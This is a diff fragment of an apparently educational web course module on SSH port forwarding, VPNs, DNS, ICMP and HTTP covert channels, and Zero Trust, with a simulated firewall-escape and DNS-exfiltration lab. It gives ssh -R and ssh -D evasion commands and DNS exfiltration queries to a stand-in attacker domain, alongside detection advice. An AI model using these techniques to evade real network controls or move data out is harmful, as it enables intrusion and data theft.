+    </div>
+  </nav>
+
+  <section class="hero">  
+    <div class="hero-bg"></div>  
+    <svg class="hero-pipes" viewBox="0 0 1200 700" preserveAspectRatio="xMidYMid slice">    
+      <defs>
+        <filter id="glow2">
+          <feGaussianBlur stdDeviation="2" result="b"/>
+          <feMerge>
+            <feMergeNode in="b"/>
+            <feMergeNode in="SourceGraphic"/>
+          </feMerge>
+        </filter>
+      </defs>    
+      <g fill="none" stroke="#10b981" stroke-opacity="0.1" filter="url(#glow2)">      
+        <polyline points="0,200 150,200 150,350 400,350 400,150 700,150 700,400 1000,400 1000,200 1200,200" stroke-width="1.5"/>      
+        <polyline points="0,500 200,500 200,300 500,300 500,500 800,500 800,300 1200,300" stroke-width="1"/>      
+        <rect x="140" y="190" width="20" height="20" rx="2" fill="rgba(16,185,129,0.15)"/>      
+        <rect x="390" y="140" width="20" height="20" rx="2" fill="rgba(16,185,129,0.15)"/>      
+        <rect x="690" y="390" width="20" height="20" rx="2" fill="rgba(16,185,129,0.15)"/>    
+      </g>    
+      <circle r="4" fill="#10b981" opacity="0.8">
+        <animateMotion dur="4s" repeatCount="indefinite" path="M0,200 L150,200 L150,350 L400,350 L400,150 L700,150 L700,400 L1000,400 L1000,200 L1200,200"/>
+      </circle>    
+      <circle r="3" fill="#34d399" opacity="0.6">
+        <animateMotion dur="5s" repeatCount="indefinite" begin="1s" path="M1200,300 L800,300 L800,500 L500,500 L500,300 L200,300 L200,500 L0,500"/>
+      </circle>    
+      <circle r="2.5" fill="#10b981" opacity="0.5">
+        <animateMotion dur="3.5s" repeatCount="indefinite" begin="2s" path="M0,200 L150,200 L150,350 L400,350 L400,150 L700,150"/>
+      </circle>  
+    </svg>  
+    <span class="hero-corner tl">CYBERNET.EDU / MOD-05</span>  
+    <span class="hero-corner tr">CLASSIFICATION: EDUCATIONAL<br>FINAL MODULE — SERIES COMPLETE</span>  
+    <span class="hero-corner bl">v2.4.1 — STABLE BUILD</span>  
+    <span class="hero-corner br">EST. DURATION: 60–80 MIN</span>  
+    <div class="hero-inner">    
+      <div class="hero-tag">Module 05 — Tunneling, Evasion &amp; Zero Trust</div>    
+      <h1>The Escape<br><em>Artist</em></h1>    
+      <p class="hero-sub">SSH TUNNELING · PORT FORWARDING · WIREGUARD · OPENVPN · COVERT CHANNELS · DNS TUNNELING · ZTNA</p>    
+      <div class="voices-grid">      
+        <div class="voice-card spy">        
+          <div class="voice-icon">🕵️</div>        
+          <div class="voice-role">The Spy — SSH Tunneling</div>        
+          <div class="voice-name">Two Ports. One Way Out.</div>        
+          <p>You're inside a hostile network. Every port is blocked except 22 and 53. The IDS is watching. The firewall logs everything. <em>But you have SSH.</em> And SSH is a tunnel you can hide anything inside.</p>      
+        </div>      
+        <div class="voice-card whistle">        
+          <div class="voice-icon">📜</div>        
+          <div class="voice-role">The Whistleblower — Covert Channels</div>        
+          <div class="voice-name">Hidden in Plain Sight.</div>        
+          <p>You need to get data out but every packet is inspected. The answer isn't to hide the channel — <em>it's to use a channel they'd never suspect.</em> DNS queries. Perfectly innocent. Everywhere. Unblockable.</p>      
+        </div>      
+        <div class="voice-card redteam">        
+          <div class="voice-icon">🔴</div>        
+          <div class="voice-role">The Red Teamer — VPNs &amp; Persistence</div>        
+          <div class="voice-name">Stay Hidden. Stay Connected.</div>        
+          <p>Day 3. You've established a foothold. Now you need persistent, encrypted access that survives reboots, evades detection, and looks like normal traffic. <em>WireGuard. Thirty lines of config. Undetectable.</em></p>      
+        </div>    
+      </div>    
+      <div class="hero-objectives">      
+        <div class="hero-obj-item"><span class="hero-obj-icon">OBJ 01</span><span class="hero-obj-text">Master SSH local, remote, and dynamic port forwarding</span></div>      
+        <div class="hero-obj-item"><span class="hero-obj-icon">OBJ 02</span><span class="hero-obj-text">Understand VPNs — WireGuard vs OpenVPN, how tunnels work</span></div>      
+        <div class="hero-obj-item"><span class="hero-obj-icon">OBJ 03</span><span class="hero-obj-text">Learn covert channels — DNS tunneling and data exfiltration</span></div>      
+        <div class="hero-obj-item"><span class="hero-obj-icon">OBJ 04</span><span class="hero-obj-text">Understand Zero Trust — why the perimeter model is dead</span></div>      
+        <div class="hero-obj-item"><span class="hero-obj-icon">LAB</span><span class="hero-obj-text">The Great Escape — firewall escape, tunnel viz, DNS covert channel</span></div>    
+      </div>    
+      <a href="#section-ssh" class="btn-start">Begin the Escape →</a>  
+    </div>
+  </section>
+  <hr class="section-divider">
+
+  <div class="section" id="section-ssh">  
+    <div class="section-tag"><span class="section-num">01 / 04</span> The Spy's Tool</div>  
+    <h2>SSH Tunneling —<br><em>Hiding Everything</em> in Port 22</h2>  
+    <div class="voice-intro vi-spy">    
+      <div class="vi-label">🕵️ The Spy</div>    
+      <p>"Port 22 is open because they need remote administration. They trust it. That trust is my tunnel. I can route any protocol — HTTP, RDP, database connections — through a single SSH connection. From the outside, it all looks like encrypted SSH traffic. The firewall sees one connection. I have everything."</p>  
+    </div>  
+    <div class="explainer">    
+      <p><strong>SSH (Secure Shell)</strong> was designed as a secure replacement for Telnet — a way to remotely administer servers over an encrypted connection. But SSH has a feature that makes it one of the most powerful evasion tools ever built: <em>port forwarding</em>. It can forward arbitrary TCP connections through its encrypted tunnel, effectively turning a single allowed port into a gateway for any protocol.</p>    
+      <p>There are three types of SSH port forwarding. Each one is a different escape mechanism for a different scenario:</p>  
+    </div>  
+    <div class="concept-grid">    
+      <div class="concept-card">      
+        <span class="tag tag-e">Local Port Forwarding</span>      
+        <h4>-L : Tunnel Traffic Out</h4>      
+        <span class="fullform">Forward a local port through SSH to a remote destination</span>      
+        <p>The most common type. <code>ssh -L 8080:internalserver:80 user@jumphost</code> — any connection to your local port 8080 gets tunneled through the SSH connection to <code>internalserver:80</code>. From your browser's perspective, you're visiting <code>localhost:8080</code>. The traffic exits the SSH server and connects to the internal target. <strong>Used to access services behind firewalls</strong> that block direct connections.</p>    
+      </div>    
+      <div class="concept-card">      
+        <span class="tag tag-amber">Remote Port Forwarding</span>      
+        <h4>-R : Tunnel Traffic In</h4>      
+        <span class="fullform">Forward a remote port through SSH back to a local destination</span>      
+        <p><code>ssh -R 9090:localhost:3389 user@externalserver</code> — anyone connecting to port 9090 on the external server gets tunneled back through SSH to your local port 3389 (RDP). <strong>Used by attackers to maintain reverse access</strong> to a compromised internal machine through a firewall that blocks inbound connections — the connection is established outward (allowed), then reversed through the tunnel.</p>    
+      </div>    
+      <div class="concept-card">      
+        <span class="tag tag-blue">Dynamic Port Forwarding</span>      
+        <h4>-D : Full SOCKS Proxy</h4>      
+        <span class="fullform">Create a SOCKS proxy that tunnels all traffic through SSH</span>      
+        <p><code>ssh -D 1080 user@jumphost</code> creates a SOCKS5 proxy on your local port 1080. Configure your browser or application to use this proxy, and <strong>all traffic is tunneled through SSH</strong> to the jump host, which forwards it onward. This is the most powerful variant — it's not limited to one port or destination. Any application that supports SOCKS proxies gains full internet access through the encrypted tunnel.</p>    
+      </div>    
+      <div class="concept-card">      
+        <span class="tag tag-purple">Detection &amp; Defence</span>      
+        <h4>How to Catch SSH Tunneling</h4>      
+        <span class="fullform">Deep Packet Inspection and anomaly detection for SSH</span>      
+        <p>SSH traffic is encrypted, making content inspection impossible. But <strong>traffic pattern anomalies reveal tunneling</strong>: SSH sessions carrying gigabytes of data, connections with high packet counts and unusual timing intervals, or SSH sessions that never terminate. Enterprise firewalls can enforce SSH application proxies that explicitly break and re-establish SSH to prevent arbitrary tunneling. <code>MaxSessions 1</code> in sshd_config limits multiplexed channels.</p>    
+      </div>  
+    </div>  
+    <div class="tunnel-diagram">    
+      <div class="tunnel-header">SSH Local Port Forwarding (-L) — The Great Escape Scenario</div>    
+      <div class="tunnel-body">      
+        <div class="tunnel-row" style="margin-bottom:0.5rem">        
+          <div class="tunnel-node active"><div class="tunnel-node-icon">💻</div><div class="tunnel-node-name">YOU</div><div class="tunnel-node-sub">localhost:8080</div></div>        
+          <div class="tunnel-pipe"><div class="tunnel-pipe-label open">Encrypted SSH (port 22)</div><div class="tunnel-pipe-line encrypted"></div></div>        
+          <div class="tunnel-node active"><div class="tunnel-node-icon">🖥</div><div class="tunnel-node-name">JUMP HOST</div><div class="tunnel-node-sub">External server</div></div>        
+          <div class="tunnel-pipe"><div class="tunnel-pipe-label open">Forwarded connection</div><div class="tunnel-pipe-line open"></div></div>        
+          <div class="tunnel-node"><div class="tunnel-node-icon">🌐</div><div class="tunnel-node-name">TARGET</div><div class="tunnel-node-sub">Internal web server</div></div>      
+        </div>      
+        <div class="tunnel-row">        
+          <div class="tunnel-node" style="visibility:hidden;min-width:110px"></div>        
+          <div class="tunnel-pipe" style="flex:1">          
+            <div style="text-align:center;font-family:var(--font-mono);font-size:11px;color:var(--text-faint);padding:0.5rem 0">            
+              ↑ Firewall sees only one encrypted SSH session on port 22.<br>No visibility into what's being forwarded.          
+            </div>        
+          </div>        
+          <div class="tunnel-fw"><div class="fw-wall-label">FIREWALL<br>BLOCKS ALL<br>EXCEPT 22, 53</div></div>        
+          <div style="min-width:110px"></div>      
+        </div>    
+      </div>  
+    </div>  
+    <div class="callout">    
+      <div class="callout-head">⚡ The Critical Command</div>    
+      <p>The entire Great Escape lab is built around one command:<br>    <code>ssh -D 1080 -N -f user@jumphost.external.com</code><br>    <code>-D 1080</code> = SOCKS proxy on port 1080 &nbsp;·&nbsp; <code>-N</code> = don't execute remote commands (tunnel only) &nbsp;·&nbsp; <code>-f</code> = run in background. Configure Firefox to use SOCKS5 proxy at 127.0.0.1:1080. All your browser traffic now exits through the jump host, bypassing every firewall rule.</p>  
+    </div>
+  </div>
+  <hr class="section-divider">
+
+  <div class="section" id="section-vpn">  
+    <div class="section-tag"><span class="section-num">02 / 04</span> Persistent Tunnels</div>  
+    <h2>VPNs — Permanent<br><em>Encrypted Pipes</em></h2>  
+    <div class="voice-intro vi-redteam">    
+      <div class="vi-label">🔴 The Red Teamer</div>    
+      <p>"SSH tunnels die when sessions drop. I need something persistent — something that survives a reboot, reconnects automatically, and generates traffic that looks exactly like everything else. WireGuard. <strong>It's 4,000 lines of code.</strong> OpenVPN is 70,000. Fewer lines means fewer bugs means fewer ways to detect me."</p>  
+    </div>  
+    <div class="explainer">    
+      <p>A <strong>VPN (Virtual Private Network)</strong> creates a permanent encrypted tunnel between two endpoints — not just for one application, but for all network traffic. Where SSH tunneling is surgical, a VPN is a wholesale relocation of your network identity. All traffic enters the tunnel at one end and exits at the other, completely invisible to anyone observing the connection in between.</p>  
+    </div>  
+    <div class="vpn-compare">    
+      <div class="vpn-col">      
+        <div class="vpn-head"><h4>WireGuard</h4><span>Modern · Minimal · Cryptographically Elegant</span></div>      
+        <div class="vpn-body">        
+          <div class="vpn-point"><span class="ico">📦</span><div><strong>~4,000 lines of code</strong> — auditable by a single developer in an afternoon. OpenVPN is 70,000+. Less code = smaller attack surface.</div></div>        
+          <div class="vpn-point"><span class="ico">⚡</span><div><strong>State-of-the-art cryptography</strong>: ChaCha20 (encryption), Poly1305 (authentication), Curve25519 (key exchange), BLAKE2 (hashing). All modern, all peer-reviewed.</div></div>        
+          <div class="vpn-point"><span class="ico">🚀</span><div><strong>Kernel-level implementation</strong> — runs in the Linux kernel directly, significantly faster than userspace VPNs. 3-5x throughput improvement over OpenVPN.</div></div>        
+          <div class="vpn-point"><span class="ico">🤫</span><div><strong>Stealth feature</strong>: WireGuard only responds to packets containing a valid cryptographic handshake. Port scanners get zero response — the port appears closed to anyone without the key.</div></div>        
+          <div class="vpn-point"><span class="ico">⚠️</span><div>Uses <strong>UDP</strong> — may be blocked on restrictive networks that only allow TCP. Static IP assignment requires manual configuration.</div></div>      
+        </div>    
+      </div>    
+      <div class="vpn-col">      
+        <div class="vpn-head"><h4>OpenVPN</h4><span>Battle-Tested · Flexible · Widely Supported</span></div>      
+        <div class="vpn-body">        
+          <div class="vpn-point"><span class="ico">🔒</span><div><strong>Can run over TCP port 443</strong> — identical to HTTPS traffic. Almost impossible to block without blocking all HTTPS, making it suitable for the most restrictive environments.</div></div>        
+          <div class="vpn-point"><span class="ico">🌍</span><div><strong>Universal compatibility</strong> — supported on every platform, every router, every enterprise VPN gateway. The safest choice for heterogeneous environments.</div></div>        
+          <div class="vpn-point"><span class="ico">🔧</span><div><strong>Highly configurable</strong> — supports certificate-based authentication, LDAP integration, multi-factor authentication, and complex routing policies.</div></div>        
+          <div class="vpn-point"><span class="ico">🐌</span><div><strong>Slower than WireGuard</strong> — userspace implementation with OpenSSL overhead. TLS handshake adds latency. Config files can be 50+ lines for complex setups.</div></div>        
+          <div class="vpn-point"><span class="ico">📋</span><div>70,000+ lines of code — larger attack surface, historically had more CVEs, but has been extensively audited over two decades of production use.</div></div>      
+        </div>    
+      </div>  
+    </div>  
+    <div class="terminal">    
+      <div class="terminal-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="terminal-label">WIREGUARD — MINIMAL CONFIG (THE ENTIRE THING)</span></div>    
+      <div class="terminal-body">      
+        <div class="term-line"><span class="term-prompt">$</span><span class="term-cmd">cat /etc/wireguard/wg0.conf</span></div>      
+        <span class="term-out faint"># WireGuard server config — this is the ENTIRE configuration. 8 lines.</span>      
+        <br>      
+        <span class="term-out hi">[Interface]</span>      
+        <span class="term-out">PrivateKey = &lt;server-private-key&gt;</span>      
+        <span class="term-out">Address = 10.0.0.1/24</span>      
+        <span class="term-out">ListenPort = 51820</span>      
+        <br>      
+        <span class="term-out hi">[Peer]</span>      
+        <span class="term-out">PublicKey = &lt;client-public-key&gt;</span>      
+        <span class="term-out">AllowedIPs = 10.0.0.2/32</span>      
+        <span class="term-out ok">PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span>      
+        <br>      
+        <div class="term-line"><span class="term-prompt">$</span><span class="term-cmd">wg-quick up wg0</span></div>      
+        <span class="term-out ok">[✓] WireGuard interface wg0 is up — tunnel active on 10.0.0.1</span>      
+        <div class="term-line"><span class="term-prompt">$</span><span class="term-cursor"></span></div>    
+      </div>  
+    </div>
+  </div>
+  <hr class="section-divider">
+
+  <div class="section" id="section-covert">  
+    <div class="section-tag"><span class="section-num">03 / 04</span> The Whistleblower's Tool</div>  
+    <h2>Covert Channels —<br>Data Hidden <em>in Plain Sight</em></h2>  
+    <div class="voice-intro vi-whistle">    
+      <div class="vi-label">📜 The Whistleblower</div>    
+      <p>"They inspect every packet. HTTPS is terminated at the proxy. SSH is blocked. But DNS is open — it has to be, or nothing works. Every device on every network resolves domain names. <strong>What they don't check is what's inside the query.</strong> I'll put my data in the subdomain field of a DNS TXT lookup. To every IDS in the world, it looks like a misconfigured DNS resolver. It is not."</p>  
+    </div>  
+    <div class="explainer">    
+      <p>A <strong>covert channel</strong> is a communication method that uses a protocol or resource in an unintended way to transmit information. The goal isn't encryption — it's <em>steganography at the protocol level</em>: hiding the fact that communication is happening at all.</p>    
+      <p><strong>DNS tunneling</strong> is the most practical covert channel ever devised. DNS (Domain Name System) queries and responses carry a payload field that most networks never inspect. Tools like <code>iodine</code> and <code>dnscat2</code> encode arbitrary data into DNS subdomain queries — a message becomes a series of lookups like <code>aGVsbG8=.secret.attacker.com</code>. The attacker controls the authoritative DNS server for their domain, which receives the encoded data and responds with encoded replies. <strong>Full bidirectional communication through any network that allows DNS.</strong></p>  
+    </div>  
+    <div class="analogy-box" style="border-left-color:var(--amber);background:var(--amber-dim);">    
+      <div class="analogy-label" style="color:var(--amber);">💡 The Real-World Analogy</div>    
+      <p>Imagine you're smuggling a message out of a prison. Guards inspect every letter — but they're only looking for forbidden content, not the <strong>length of each word</strong>. You encode your message in the word lengths: "I am okay" = 1-2-4 = dots and dashes. The guards read the letter, find nothing suspicious, and send it through. The recipient counts the letters. <strong>DNS tunneling is exactly this — data hidden in the structure of normal-looking queries.</strong></p>  
+    </div>  
+    <div class="concept-grid">    
+      <div class="concept-card">      
+        <span class="tag tag-amber">DNS Tunneling</span>      
+        <h4>iodine / dnscat2</h4>      
+        <span class="fullform">Encoding arbitrary data inside DNS query subdomains and TXT record responses</span>      
+        <p>The attacker encodes data in base32 or base64 and uses it as the subdomain of a query: <code>aGVsbG8=.c2.attacker.com</code>. The attacker's authoritative DNS server decodes the subdomain and responds with encoded data in the TXT or NULL record. Bandwidth is limited (~1-3 Kbps) but sufficient for shell sessions, small file exfiltration, or C2 (Command & Control) communications. Used in real APT (Advanced Persistent Threat) campaigns including the DNSMessenger malware.</p>    
+      </div>    
+      <div class="concept-card">      
+        <span class="tag tag-e">ICMP Tunneling</span>      
+        <h4>ptunnel / icmptunnel</h4>      
+        <span class="fullform">Embedding TCP data inside ICMP Echo Request and Reply packets</span>      
+        <p>ICMP ping packets have an arbitrary data payload field. <code>ptunnel</code> encodes TCP connections inside ICMP echo requests/replies. Networks that block all TCP/UDP but allow pings (for monitoring purposes) become usable tunnels. Detection is straightforward — ICMP packets with large, non-standard payloads — but many legacy networks and monitoring tools don't filter on ICMP payload content, making this surprisingly effective in certain environments.</p>    
+      </div>    
+      <div class="concept-card">      
+        <span class="tag tag-blue">HTTP Tunneling</span>      
+        <h4>chisel / HTTPTunnel</h4>      
+        <span class="fullform">Wrapping arbitrary TCP connections inside HTTP or HTTPS requests</span>      
+        <p>On networks that only allow web traffic, tools like <code>chisel</code> establish a WebSocket connection over HTTP/HTTPS and tunnel any TCP protocol through it. From the network's perspective, it's a long-lived HTTPS connection to a web server — completely indistinguishable from normal browser traffic. This is the "allowed protocol wrapper" attack: the container (HTTPS) is trusted, so anything inside it passes.</p>    
+      </div>    
+      <div class="concept-card">      
+        <span class="tag tag-purple">Detection</span>      
+        <h4>Catching Covert Channels</h4>      
+        <span class="fullform">Anomaly detection, DNS monitoring, and DPI for covert channel identification</span>      
+        <p>DNS tunneling leaves statistical fingerprints: <strong>unusually long subdomain names</strong> (base64 encoded data), <strong>high query frequency</strong> to a single domain, <strong>TXT/NULL record queries</strong> (rare in legitimate traffic), and <strong>no matching cached responses</strong> (every encoded query is unique). Enterprise DNS filtering solutions (Cisco Umbrella, Infoblox) flag these patterns automatically. The defence is DNS analytics, not packet inspection.</p>    
+      </div>  
+    </div>
+  </div>
+  <hr class="section-divider">
+
+  <div class="section" id="section-zt">  
+    <div class="section-tag"><span class="section-num">04 / 04</span> The Future</div>  
+    <h2>Zero Trust Architecture —<br><em>The Perimeter Is Dead</em></h2>  
+    <div class="voice-intro vi-arch">    
+      <div class="vi-label">🏛 The Architect</div>    
+      <p>"Every technique in this module assumes something: that if you're inside the network, you're trusted. The VPN gets you inside. The SSH tunnel bypasses the firewall once you're in. DNS tunneling works because internal DNS is trusted. <strong>Zero Trust eliminates all of that.</strong> There is no inside. There is no perimeter. Every request is authenticated, every time, regardless of where it comes from."</p>  
+    </div>  
+    <div class="explainer">    
+      <p>Traditional network security is built on the <strong>castle-and-moat model</strong>: a hard perimeter, a trusted interior. Everything inside the firewall is assumed to be safe. This model was designed for a world where employees worked at desks in a building, servers lived in on-premise data centres, and "the network" had a clear boundary.</p>    
+      <p>That world is gone. Employees work from coffee shops. Applications live in the cloud. Partners need access to internal systems. Attackers — as every module in this course has demonstrated — routinely get past the perimeter. Once inside, the traditional model gives them enormous freedom to move laterally, escalate privileges, and exfiltrate data. <strong>Zero Trust</strong> assumes breach has already occurred and requires verification for every single access request.</p>  
+    </div>  
+    <div class="zt-compare">    
+      <div class="zt-col old">      
+        <h4>🏰 Castle &amp; Moat (Traditional)</h4>      
+        <div class="zt-point"><span class="ico">❌</span><div><strong>Trust by location:</strong> "You're on the internal network, so you're trusted." VPNs extend this trust remotely.</div></div>      
+        <div class="zt-point"><span class="ico">❌</span><div><strong>Implicit trust:</strong> Once authenticated once at the perimeter, lateral movement is largely unrestricted.</div></div>      
+        <div class="zt-point"><span class="ico">❌</span><div><strong>Binary access:</strong> You either have VPN access (everything) or you don't (nothing).</div></div>      
+        <div class="zt-point"><span class="ico">❌</span><div><strong>Single failure point:</strong> One compromised credential, one phished employee, and the attacker is "trusted."</div></div>      
+        <div class="zt-point"><span class="ico">❌</span><div><strong>Invisible users:</strong> Once inside, user actions are rarely logged per-resource — broad network access creates massive blind spots.</div></div>    
+      </div>    
+      <div class="zt-col new">      
+        <h4>✅ Zero Trust Network Architecture</h4>      
+        <div class="zt-point"><span class="ico">✅</span><div><strong>Never trust, always verify:</strong> Every request is authenticated regardless of source — internal, VPN, cloud, or office.</div></div>      
+        <div class="zt-point"><span class="ico">✅</span><div><strong>Least privilege access:</strong> Users get access only to the specific application they need, not the entire network. A compromised account reaches one app, not everything.</div></div>      
+        <div class="zt-point"><span class="ico">✅</span><div><strong>Continuous verification:</strong> Session trust is re-evaluated continuously — device posture, location, behaviour anomalies can trigger step-up authentication mid-session.</div></div>      
+        <div class="zt-point"><span class="ico">✅</span><div><strong>Micro-segmentation:</strong> Resources are isolated from each other. Lateral movement requires separate authentication for each target — tunneling to "the internal network" yields nothing useful.</div></div>      
+        <div class="zt-point"><span class="ico">✅</span><div><strong>Full observability:</strong> Every access attempt is logged with user identity, device posture, time, resource, and outcome — complete audit trail for forensics.</div></div>    
+      </div>  
+    </div>  
+    <div class="callout purple">    
+      <div class="callout-head">🏢 Real-World Zero Trust</div>    
+      <p>Google's <strong>BeyondCorp</strong> (2014) was the first large-scale ZTNA deployment — after the Operation Aurora breach, Google eliminated their internal network entirely. Every application requires identity verification regardless of whether the user is in a Google office or a café. <strong>Cloudflare Access</strong> and <strong>Zscaler Private Access</strong> offer this as a cloud service. The principle: your SSH tunnel into "the network" gets you nothing — each service requires its own authentication, every time.</p>  
+    </div>
+  </div>
+  <hr class="section-divider">
+
+  <div class="section" id="section-lab">  
+    <div class="section-tag"><span class="section-num">LAB</span> The Great Escape</div>  
+    <h2>Lab: Three Phases,<br>One <em>Complete Escape</em></h2>  
+    <div class="explainer">    
+      <p>You're inside a locked-down network. Only ports 22 (SSH) and 53 (DNS) are open. Everything else — HTTP, HTTPS, RDP, databases — is blocked. You have three ways out. Use all three.</p>  
+    </div>  
+    <div class="lab-wrap">    
+      <div class="lab-header">      
+        <span class="lab-badge">🔐 Live Lab</span>      
+        <span class="lab-title">The Great Escape — Tunneling &amp; Evasion Simulation</span>    
+      </div>    
+      <div class="lab-tabs">      
+        <button class="lab-tab active" id="lt0" onclick="showLabTab(0)">① Firewall Escape</button>      
+        <button class="lab-tab" id="lt1" onclick="showLabTab(1)">② Tunnel Visualiser</button>      
+        <button class="lab-tab" id="lt2" onclick="showLabTab(2)">③ DNS Covert Channel</button>    
+      </div>    
+
+      <div class="lab-body" id="lp0">      
+        <p style="font-size:15px;color:var(--text-dim);margin-bottom:1.2rem;line-height:1.75;">You're inside the locked network. The port table below shows what's open and what's blocked. Your mission: use SSH dynamic port forwarding to escape. Run the commands in sequence and watch the ports change state.</p>      
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin-bottom:1.5rem">        
+          <div>          
+            <div style="font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.12em;margin-bottom:0.6rem;text-transform:uppercase;">Current Port Status</div>          
+            <div class="port-table" id="portTable">            
+              <table>              
+                <thead><tr><th>Port</th><th>Service</th><th>Status</th></tr></thead>              
+                <tbody id="portTableBody"></tbody>            
+              </table>          
+            </div>        
+          </div>        
+          <div>          
+            <div style="font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.12em;margin-bottom:0.6rem;text-transform:uppercase;">Network Diagram</div>          
+            <div class="fw-vis">            
+              <div class="fw-vis-grid">              
+                <div class="fw-box"><div class="fw-box-icon">💻</div><div class="fw-box-name">YOU</div><div class="fw-box-sub" id="fwYouSub">Locked inside</div></div>              
+                <div style="flex:1;padding:0 6px">                
+                  <div id="fwPipeRows" style="display:flex;flex-direction:column;gap:4px;margin-top:0.5rem"></div>              
+                </div>              
+                <div class="fw-wall"><div class="fw-wall-label" id="fwWallLabel">FIREWALL<br>BLOCKING</div></div>              
+                <div class="fw-box" id="fwOutside"><div class="fw-box-icon">🌐</div><div class="fw-box-name">INTERNET</div><div class="fw-box-sub" id="fwOutsideSub">Unreachable</div></div>            
+              </div>          
+            </div>        
+          </div>      
+        </div>      
+        <div class="cmd-palette" id="fwCmds"></div>      
+        <div class="terminal">        
+          <div class="terminal-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="terminal-label">RESTRICTED NETWORK — ESCAPE TERMINAL</span></div>        
+          <div class="terminal-body" id="fwOutput">          
+            <div class="term-line"><span class="term-prompt">user@locked-network:~$</span><span class="term-cursor"></span></div>        
+          </div>      
+        </div>      
+        <div id="p0-result" style="display:none"></div>    
+      </div>    
+
+      <div class="lab-body" id="lp1" style="display:none">      
+        <p style="font-size:15px;color:var(--text-dim);margin-bottom:1.2rem;line-height:1.75;">The SSH tunnel is active. This visualiser shows what your traffic looks like to a network observer — both without and inside the tunnel. Toggle between modes and watch the difference.</p>      
+        <div class="tvis-wrap">        
+          <canvas class="tvis-canvas" id="tvisCanvas"></canvas>        
+          <div class="tvis-legend">          
+            <div class="tvis-legend-item"><div class="tvis-dot" style="background:var(--red)"></div> Blocked (no tunnel)</div>          
+            <div class="tvis-legend-item"><div class="tvis-dot" style="background:var(--e)"></div> SSH encrypted tunnel</div>          
+            <div class="tvis-legend-item"><div class="tvis-dot" style="background:var(--blue)"></div> HTTP traffic inside tunnel</div>          
+            <div class="tvis-legend-item"><div class="tvis-dot" style="background:var(--amber)"></div> Firewall inspection point</div>        
+          </div>      
+        </div>      
+        <div style="display:flex;gap:10px;margin:1rem 0;flex-wrap:wrap">        
+          <button class="btn-encode" onclick="tvisMode('blocked')">🚫 Without Tunnel</button>        
+          <button class="btn-encode" onclick="tvisMode('tunnel')">🔐 With SSH Tunnel</button>        
+          <button class="btn-encode" onclick="tvisMode('both')">⚡ Compare Both</button>      
+        </div>      
+        <div id="p1-result" style="display:none"></div>    
+      </div>    
+
+      <div class="lab-body" id="lp2" style="display:none">      
+        <p style="font-size:15px;color:var(--text-dim);margin-bottom:1.2rem;line-height:1.75;">SSH is logged. The security team noticed the long-running session. Switch to the covert channel: encode a secret message inside DNS queries. The IDS will see only normal DNS lookups — your data rides inside the subdomain field, completely hidden.</p>      
+        <div class="dns-encoder">        
+          <div class="dns-encoder-label">⚙ DNS Covert Channel — Encode Your Message</div>        
+          <div class="dns-encode-row">          
+            <input class="dns-input" id="secretMsg" placeholder="Type your secret message to exfiltrate..." maxlength="60"/>          
+            <button class="btn-encode" onclick="encodeDNS()">Encode → DNS Queries</button>        
+          </div>        
+          <div class="dns-query-display" id="dnsQueryDisplay">          
+            <span style="color:var(--text-faint)">Your encoded DNS queries will appear here...</span>        
+          </div>        
+          <div class="dns-ids-log" id="dnsIdsLog">          
+            <span style="color:var(--text-faint)">IDS log will appear here after encoding...</span>        
+          </div>      
+        </div>      
+        <div style="margin:1rem 0">        
+          <button class="btn-encode" id="exfilBtn" style="display:none" onclick="exfilData()">▶ Exfiltrate via DNS Tunnel</button>      
+        </div>      
+        <div class="terminal" id="dnsTerminal" style="display:none">        
+          <div class="terminal-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="terminal-label">DNS TUNNEL — DNSCAT2 / IODINE</span></div>        
+          <div class="terminal-body" id="dnsOutput"></div>      
+        </div>      
+        <div id="p2-result" style="display:none"></div>    
+      </div>  
+    </div>
+  </div>
+  <hr class="section-divider">
+
+  <div class="section" id="section-quiz">  
+    <div class="section-tag"><span class="section-num">FINAL</span> The Last Test</div>  
+    <h2>Five Modules Down —<br>Prove You <em>Own All of It</em></h2>  
+    <p style="color:var(--text-dim);font-size:16px;margin-bottom:2rem;">The final five questions. These draw on everything — tunneling, evasion, covert channels, Zero Trust. All five correct to complete the series.</p>  
+    <div class="quiz-wrap">    
+      <div class="quiz-header"><h4>Module 5 — Final Assessment</h4><span class="quiz-score" id="quizScore">0 / 5 correct</span></div>    
+      <div id="quizQuestions"></div>  
+    </div>
+  </div>
+
+  <div class="completion" id="completion">  
+    <div class="series-badge"><div class="series-badge-ring">🎓</div></div>  
+    <h2>Series <em>Complete</em></h2>  
+    <div class="completion-subtitle">CyberNet Networking Security — All 5 Modules</div>  
+    <p>You started by reading the blueprint. You ended by escaping through it. Five modules. Five attack surfaces. The OSI model, packet capture, ARP poisoning, MitM attacks, SYN floods, amplification, wireless handshakes, Evil Twins, SSH tunnels, DNS covert channels — you've been on both sides of every one.</p>  
+    <div class="series-modules">    
+      <div class="series-mod"><div class="series-mod-icon">🗺</div><div class="series-mod-num">MOD 01</div><div class="series-mod-name">The Blueprint &amp; The Scout</div></div>    
+      <div class="series-mod"><div class="series-mod-icon">👻</div><div class="series-mod-num">MOD 02</div><div class="series-mod-name">Ghosts on the Wire</div></div>    
+      <div class="series-mod"><div class="series-mod-icon">⚔️</div><div class="series-mod-num">MOD 03</div><div class="series-mod-name">Overwhelming Force</div></div>    
+      <div class="series-mod"><div class="series-mod-icon">📡</div><div class="series-mod-num">MOD 04</div><div class="series-mod-name">Invisible Airwaves</div></div>    
+      <div class="series-mod"><div class="series-mod-icon">🎭</div><div class="series-mod-num">MOD 05</div><div class="series-mod-name">The Escape Artist</div></div>  
+    </div>  
+    <div class="completion-stats">    
+      <div class="stat"><span class="stat-val" id="statTime">—</span><span class="stat-label">Minutes</span></div>    
+      <div class="stat"><span class="stat-val">5/5</span><span class="stat-label">Quiz Score</span></div>    
+      <div class="stat"><span class="stat-val" id="statLab">0/3</span><span class="stat-label">Lab Phases</span></div>  
+    </div>
+
+    <div class="futuristic-flag-card">
+      <div class="flag-badge">
+        <span>⚡</span> decrypted_key.bin <span>⚡</span>
+      </div>
